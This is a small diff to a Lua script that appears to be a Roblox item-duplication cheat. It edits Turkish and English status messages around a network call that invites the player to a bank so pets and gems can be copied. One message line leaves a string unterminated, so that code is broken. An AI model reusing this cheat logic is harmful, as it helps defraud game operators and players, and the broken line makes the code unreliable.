@@ -15,7 +15,7 @@ lib.Message.New("Dupe starting! Wait for 30 Minutes (Powered By F̷u̷r̷k̷a̷n
 else
 end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
-lib.Message.New("Dupe Yapılıyor (Make sure your bank has pets or gems for duping!!)");
+lib.Message.New("Dupe Yapılıyor Bankandaki Petler Ve Gemler Dupeleniyor!!)");
 else
-lib.Message.New("30 Saniye Bekleyin 30 Saniye Sonra Petleriniz Ve Gemleriniz);
+lib.Message.New("30 Saniye Bekleyin 30 Saniye Sonra Petleriniz Ve Gemleriniz Dupelenicek);
 end;
